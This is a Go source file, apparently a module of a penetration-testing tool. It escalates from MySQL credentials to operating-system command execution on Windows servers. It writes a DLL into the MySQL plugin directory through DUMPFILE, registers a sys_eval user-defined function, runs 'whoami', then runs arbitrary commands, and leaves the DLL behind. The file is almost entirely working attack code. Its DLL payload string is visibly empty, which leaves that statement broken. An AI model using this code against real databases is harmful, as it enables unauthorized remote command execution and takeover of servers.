package sqlcmdmodule

import (
	"cube/config"
	"cube/gologger"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"strings"
)

type Mysql struct {
	*Sqlcmd
}

func (m Mysql) SqlcmdName() string {
	return "mysql"
}

func (m Mysql) SqlcmdPort() string {
	return "3306"
}

func (m Mysql) SqlcmdDesc() string {
	return "exec cmd via sys_eval, only support windows x64"
}

func (m Mysql) SqlcmdExec() SqlcmdResult {
	result := SqlcmdResult{Sqlcmd: *m.Sqlcmd, Result: "", Err: nil}
	dataSourceName := fmt.Sprintf("%v:%v@tcp(%v:%v)/mysql?charset=utf8&timeout=%v&multiStatements=true", m.User, m.Password, m.Ip, m.Port, config.TcpConnTimeout)

	db, err := sql.Open("mysql", dataSourceName)
	if err != nil {
		result.Err = err
		return result
	}
	if m.Query == "clear" {
		if checkUDF(db) {
			clear(db)
			gologger.Info("[*] drop sys_eval function Successful, But the udftest.dll will exist")
		} else {
			gologger.Info("[*] function sys_eval doesn't exist")
		}

		return result
	}

	if checkUDF(db) {
		exec(db, m.Query)
	} else {
		pluginDir := queryPluginDir(db)
		fmt.Printf("[*] Plugin Dir: %s\n", pluginDir)
		createUDF(db, strings.Replace(pluginDir+"udftest.dll", "\\", "\\\\", -1))
		exec(db, "whoami")
	}

	return result
}

func queryPluginDir(db *sql.DB) string {
	sqlText := "select @@plugin_dir"
	stmt, err := db.Prepare(sqlText)
	if err != nil {
		gologger.Error(err)
	}
	var pluginDir string

	err = stmt.QueryRow().Scan(&pluginDir)
	if err != nil && err != sql.ErrNoRows {
		gologger.Error(err)
	}
	return pluginDir
}

func createUDF(db *sql.DB, pluginDir string) {
	var rows *sql.Rows
	fmt.Println("[*] Creating UDF......")
	sqlText := fmt.Sprintf("set @my_udf_a=concat('',);"+
		"drop table if exists my_udf_data;"+
		"create table my_udf_data(data LONGBLOB);"+
		"insert into my_udf_data values('');"+
		"update my_udf_data set data = @my_udf_a;"+
		"select data from my_udf_data into DUMPFILE '%s';"+
		"create function sys_eval returns string soname 'udftest.dll';select sys_eval('whoami');", pluginDir)
	rows, err := db.Query(sqlText)
	if err != nil {
		if strings.Contains(err.Error(), "1086") {
			println("[*] udftest.dll already exist, Creating sys_eval function")
			sqlQuery := "create function sys_eval returns string soname 'udftest.dll';select sys_eval('whoami');"
			rows, err = db.Query(sqlQuery)
			if err != nil {
				gologger.Errorf("Err in create UDF: %s", err)
			}
		} else {
			gologger.Errorf("Err in create UDF: %s", err)
		}
	}

	cols, _ := rows.Columns()
	for rows.Next() {
		err := rows.Scan(&cols[0])
		if err != nil {
			gologger.Error(err)
		}
		fmt.Println(cols[0])
	}

}

func exec(db *sql.DB, cmd string) {
	var r sql.NullString
	sqlQuery := fmt.Sprintf("select sys_eval(\"%s\")", fmt.Sprintf(strings.Replace(cmd, "\\", "\\\\", -1)))
	rows, err := db.Query(sqlQuery)
	if err != nil {
		fmt.Println(err)
	}

	//cols, _ := rows.Columns()
	for rows.Next() {
		err := rows.Scan(&r)
		if err != nil {
			gologger.Error(err)
		}
		fmt.Println(r.String)
	}
}

func checkUDF(db *sql.DB) (b bool) {
	querySql := fmt.Sprintf("select sys_eval('')")
	rows, err := db.Query(querySql)
	if err != nil {
		return false
	}
	var s sql.NullString
	//_, _ = rows.Columns()
	for rows.Next() {
		err := rows.Scan(&s)
		if err != nil {
			gologger.Error(err)
			b = false
		} else {
			b = true
		}
	}
	return b
}

func clear(db *sql.DB) {
	querySql := fmt.Sprintf("drop function if exists sys_eval")
	_, err := db.Query(querySql)
	if err != nil {
		gologger.Error(err)
	}

}
